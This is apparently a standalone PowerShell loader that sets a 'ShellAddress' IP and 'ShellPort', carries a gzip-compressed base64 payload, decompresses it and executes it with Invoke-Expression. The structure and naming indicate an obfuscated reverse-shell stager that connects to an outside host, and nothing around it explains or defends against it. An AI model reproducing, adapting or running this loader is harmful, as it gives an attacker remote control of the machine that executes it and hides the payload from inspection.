

$Script:ShellAddress = "64.228.230.38"
$Script:ShellPort = 20001

$ScriptString = "H4sIAAAAAAAACq1U0U6jQBR9J+Ef2Npdh1gmtZqN0bAJxbGSVNowo65pmg3C1eJS6A7Trc2u/75DtS0F9GnhhcC555x77h1URZX33t6e1qQBj2bilE4gjq0w5JBlmqk1vh7jTucEd47a+OikUYMdplxIYKfdbh/mZKoysqdhDKIbJWGUPCI6n80kJqOTdB6HQ54Gklofq8rM5/4U6XlJk3CecisQUZoMOTwAhyQASbtPRTrbVxXBl6ryR1U0ea3lLc+z7s4tZknciC4zAVPcXQoYjcenpzYHX4CTZMKXTKj4fdw6bHeO9bMV27ab/0K3decSNmSe6cLCGNw/QSC0txoXBKZp8BNEhpk9tOMIEoHq8m9VgtbfRBaTKIZNjWff5L7NXWncI4Iyj1hXSF/XvSW4piBlChz6wrd+W05s3fdBM1KuFRAuue3eMUI1A35VY8N2Onc3DnfFisEUiMyyvAf+Oaowt9qtqlpM3J643MReEpGNO24vBx6YyIVbY9B9InIGhlgOiWtNQcuWGSNXWMAzw1ZmOxG4QRo67qOOHwnL6+XufmSl0If+UrIRPaCqk0I0NfHs2Cffie0Ret1n1EQRea5j63z7cvh3cC0MKrwo6ZWTyK/qG+cBfUI1KrgPSU9MPldzDgbzhG0WqOi/VuCdLg7Mhvx5lIEv+dl/r3rALom32ms0Wk0JXDs9l1ORx9GXA3PyQYnunYCsriP9rLxcCx6x7aHZ0BdGunn3Gkdlu4r21qwX/TmdoI+Q25mZzeS6H+8iZQY1j69PqvIS+CKYvK7KLY8EGDfA79MMtEbzh0x0leA/RirV78YFAAA="
function Convert-FromBase64CompressedScriptBlock {

    [CmdletBinding()] param(
        [String]
        $ScriptBlock
    )

    # Base64 to Byte array of compressed data
    $ScriptBlockCompressed = [System.Convert]::FromBase64String($ScriptBlock)

    # Decompress data
    $InputStream = New-Object System.IO.MemoryStream(, $ScriptBlockCompressed)
    $MemoryStream = New-Object System.IO.MemoryStream
    $GzipStream = New-Object System.IO.Compression.GzipStream $InputStream, ([System.IO.Compression.CompressionMode]::Decompress)
    $GzipStream.CopyTo($MemoryStream)
    $GzipStream.Close()
    $MemoryStream.Close()
    $InputStream.Close()
    [Byte[]] $ScriptBlockEncoded = $MemoryStream.ToArray()

    # Byte array to String
    [System.Text.Encoding] $Encoding = [System.Text.Encoding]::UTF8
    $Encoding.GetString($ScriptBlockEncoded) | Out-String
}


$Data = Convert-FromBase64CompressedScriptBlock $ScriptString

iex $Data